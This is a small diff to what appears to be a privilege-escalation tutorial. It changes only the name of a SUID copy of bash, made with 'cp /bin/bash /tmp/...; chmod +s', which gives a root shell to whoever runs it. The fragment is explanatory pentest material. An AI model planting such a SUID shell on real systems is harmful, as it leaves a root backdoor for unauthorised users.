@@ -5,7 +5,7 @@
 In this method we create a copy of bash binary with root privileges and set SUID bit on, resulting in bash executable which when executed always run with a context of root user.
 
 ```text
-cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+cp /bin/bash /tmp/yzbash; chmod +s /tmp/yzbash
 ```
 
 After creating a copy, we can run it in unprivileged terminal.
